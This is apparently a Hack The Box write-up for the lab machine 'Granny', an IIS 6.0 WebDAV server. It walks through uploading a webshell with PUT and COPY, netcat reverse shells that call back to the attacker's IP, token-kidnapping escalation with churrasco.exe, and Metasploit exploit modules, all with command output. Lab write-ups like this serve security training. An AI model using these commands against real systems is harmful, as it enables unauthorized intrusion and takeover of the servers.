## Default Information
IP Address: 10.10.10.15\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.15    granny.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
{masscan output}
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80	| HTTP | Microsoft IIS httpd 6.0 | Open |

From the nmap scan, we can also see that for this server, there are a few potentially dangerous methods which could allow us to upload malicious files.

```
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
```
### Sslyze

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://swagshop.htb

```
http://10.10.10.15:80/_vti_bin/_vti_aut/author.dll (Status: 200) [Size: 195]
http://10.10.10.15:80/_vti_bin/shtml.dll   (Status: 200) [Size: 96]
http://10.10.10.15:80/_vti_inf.html        (Status: 200) [Size: 1754]
http://10.10.10.15:80/_vti_bin/_vti_adm/admin.dll (Status: 200) [Size: 195]
http://10.10.10.15:80/postinfo.html        (Status: 200) [Size: 2440]
http://10.10.10.15:80/Images               (Status: 301) [Size: 152] [--> http://10.10.10.15:80/Images/]
http://10.10.10.15:80/_vti_log             (Status: 301) [Size: 158] [--> http://10.10.10.15:80/%5Fvti%5Flog/]
http://10.10.10.15:80/_private             (Status: 301) [Size: 156] [--> http://10.10.10.15:80/%5Fprivate/]
http://10.10.10.15:80/_vti_bin             (Status: 301) [Size: 158] [--> http://10.10.10.15:80/%5Fvti%5Fbin/]
http://10.10.10.15:80/aspnet_client        (Status: 301) [Size: 161] [--> http://10.10.10.15:80/aspnet%5Fclient/]
http://10.10.10.15:80/images               (Status: 301) [Size: 152] [--> http://10.10.10.15:80/images/]
```

### Web-Content Discovery

From above the endpoints that were discovered by Gobuster were unable to provide any useful endpoints which could possibly be exploited.

From the nmap scan earlier, we recall that there were dangerous methods that are enabled which could potentially upload malicious files. Now, let us use ```davtest``` to find out the type of files that we could potentially upload. From the output, we realize that we are unable to upload .aspx files, which was what we wanted.

```
/usr/bin/davtest Summary:
Created: http://granny.htb/DavTestDir_sf8bqWLfPepKPyV
PUT File: http://granny.htb/DavTestDir_sf8bqWLfPepKPyV/davtest_sf8bqWLfPepKPyV.cfm
PUT File: http://granny.htb/DavTestDir_sf8bqWLfPepKPyV/davtest_sf8bqWLfPepKPyV.html
PUT File: http://granny.htb/DavTestDir_sf8bqWLfPepKPyV/davtest_sf8bqWLfPepKPyV.jhtml
PUT File: http://granny.htb/DavTestDir_sf8bqWLfPepKPyV/davtest_sf8bqWLfPepKPyV.php
PUT File: http://granny.htb/DavTestDir_sf8bqWLfPepKPyV/davtest_sf8bqWLfPepKPyV.jsp
PUT File: http://granny.htb/DavTestDir_sf8bqWLfPepKPyV/davtest_sf8bqWLfPepKPyV.txt
PUT File: http://granny.htb/DavTestDir_sf8bqWLfPepKPyV/davtest_sf8bqWLfPepKPyV.pl
Executes: http://granny.htb/DavTestDir_sf8bqWLfPepKPyV/davtest_sf8bqWLfPepKPyV.html
Executes: http://granny.htb/DavTestDir_sf8bqWLfPepKPyV/davtest_sf8bqWLfPepKPyV.txt
```

## Exploit
### Exploiting PUT method
Let us verify if we can upload an aspx webshell using the PUT command. From the output, we can see that we are unable to upload a .aspx webshell onto the web server. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X PUT http://granny.htb/cmd.aspx -d @cmd.aspx
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be displayed</h1>
You have attempted to execute a CGI, ISAPI, or other executable program from a directory that does not allow programs to be executed.
<hr>
<p>Please try the following:</p>
<ul>
<li>Contact the Web site administrator if you believe this directory should allow execute access.</li>
</ul>
<h2>HTTP Error 403.1 - Forbidden: Execute access is denied.<br>Internet Information Services (IIS)</h2>
```

However, if we try to upload a text file, the file would be successfully uploaded.
![Uploading text file with PUT method](https://github.com/joelczk/writeups/blob/main/HTB/Images/Granny/put_text.png)

However, we know from the earlier nmap scan that the COPY http method is also available on this web server. We can then first upload the aspx webshell in text format, and then afterwards use the COPY method to copy the aspx webshell in the text format to another endpoint with the .aspx file format.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X PUT http://granny.htb/cmd.txt -d @cmd.txt

┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X COPY -H 'Destination:http://granny.htb/cmd.aspx' http://granny.htb/cmd.txt
```

### Obtaining reverse shell

To obtain the reverse shell, first we would have to copy the nc.exe executable to our local directory. Afterwards, we will have to start the SMB Server using ```impacket-smbserver```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-smbserver share granny 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Afterwards, we will navigate to http://granny.htb/cmd.aspx and input ```\\10.10.16.8\share\nc.exe -e cmd.exe 10.10.16.8 4000``` into the command to be executed. This will then download the nc.exe exexcutable onto the backend server and cause a reverse shell to be spawned.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000 
listening on [any] 4000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.15] 1032
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>
```

### Privilege Escalation to root

After obtaining the reverse shell, we realize that our user is ```nt authority\network service``` and we do not have adminstrator privileges. As a result, we are unable to obtain the user flag in the Lakis directory.

```
C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\Documents and Settings

04/12/2017  09:19 PM    <DIR>          .
04/12/2017  09:19 PM    <DIR>          ..
04/12/2017  08:48 PM    <DIR>          Administrator
04/12/2017  04:03 PM    <DIR>          All Users
04/12/2017  09:19 PM    <DIR>          Lakis
               0 File(s)              0 bytes
               5 Dir(s)   1,222,238,208 bytes free

C:\Documents and Settings>cd Lakis
cd Lakis
Access is denied.
```

Using systeminfo, we can get the OS name and version that is being used.

```
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition                                     
OS Version:                5.2.3790 Service Pack 2 Build 3790   
```

Searching up the OS name and version on [exploitdb](https://www.exploit-db.com/exploits/6705), we are able to find a privilege escalation using Token kidnapping.

To exploit, this vulnerability, we will first need to download churrasco.exe from (here)[https://github.com/Re4son/Churrasco/raw/master/churrasco.exe]. Afterwards, we will transfer it to the machine using the SMB server that we have set up earlier.

```
C:\WINDOWS\Temp>copy \\10.10.16.8\share\churrasco.exe
```

Using the churrasco.exe executable, we will be able to obtain system privileges.

```
C:\WINDOWS\Temp>churrasco.exe "whoami"                                                             
nt authority\system 
```

Lastly, we will use churrasco.exe to create a reverse shell with root privileges.

```
C:\WINDOWS\Temp>churrasco.exe "nc.exe -e cmd.exe 10.10.16.8 3000"                                                    
churrasco.exe "nc.exe -e cmd.exe 10.10.16.8 3000"                                                                          
C:\WINDOWS\Temp>    
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.15] 1103
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```

### Obtaining user flag

```
C:\Documents and Settings\Lakis\Desktop>type user.txt
type user.txt
<Redacted user flag>
```
### Obtaining root flag

```
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
```

## Post-Exploitation
### Privilege Escalation using Metasploit
Before we even start to do any privilege escalation using Metasploit, we would first need to capture the reverse shell on Metaploit. 

For that to take place, we would first need to create a reverse shell. However, what is different from the previous exploit that we have done is that, we will be using a Metasploit exploit from [here](https://www.exploit-db.com/exploits/41992) since we know that the web server is using IIS 6.0

```
msf6 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST 10.10.16.8
LHOST => 10.10.16.8
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.15
RHOSTS => 10.10.10.15
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
[*] Started reverse TCP handler on 10.10.16.8:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.16.8:4444 -> 10.10.10.15:1107) at 2022-01-08 07:43:59 -0500
meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 1544 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```
However, before we continue we would need to migrate to a more stable and privileged process so that we will not be getting privileged denied when we try to execute the exploits. We will first need to list the processes using ```ps``` and afterwards, we will then need to find the process number for any processes with ```NT AUTHORITY\NETWORK SERVICE``` privileges. Lastly, we will have to background this session.

```
meterpreter > migrate 2704
[*] Migrating from 3056 to 2704...
[*] Migration completed successfully.
meterpreter > background
[*] Backgrounding session 1...
```

Next, we will have to background the meterpreter session that is running and execute the local_exploit_suggester module to find possible exploits that we could use.

```
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > search local_exploit

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1 
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 38 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

Afterwards, we will then try out all the exploits. From our experimentation, we know that the following exploits are vulnerable:
- exploit/windows/local/ms10_015_kitrap0d
- exploit/windows/local/ms14_070_tcpip_ioctl
- exploit/windows/local/ms15_051_client_copy_image
- 


```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
set LHOST 10.10.16.8
set SESSION 1
set LPORT 3000
msf6 exploit(windows/local/ms15_051_client_copy_image) > exploit

[*] Started reverse TCP handler on 10.10.16.8:3000 
[*] Launching notepad to host the exploit...
[+] Process 3272 launched.
[*] Reflectively injecting the exploit DLL into 3272...
[*] Injecting exploit into 3272...
[*] Exploit injected. Injecting payload into 3272...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.16.8:3000 -> 10.10.10.15:1032) at 2022-01-08 08:26:39 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
